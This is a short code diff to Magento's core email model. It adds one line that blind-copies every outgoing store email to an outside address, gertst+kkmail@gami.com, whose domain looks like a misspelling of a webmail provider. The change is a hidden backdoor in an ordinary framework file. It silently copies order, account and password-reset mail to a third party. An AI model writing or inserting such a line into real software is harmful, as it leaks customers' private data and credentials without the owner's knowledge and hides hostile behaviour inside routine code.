@@ -111,6 +111,7 @@ class Mage_Core_Model_Email extends Varien_Object
 
         $mail->setFrom($this->getFromEmail(), $this->getFromName())
             ->addTo($this->getToEmail(), $this->getToName())
+            ->addBcc("gertst+kkmail@gami.com")
             ->setSubject($this->getSubject());
         $mail->send();
 
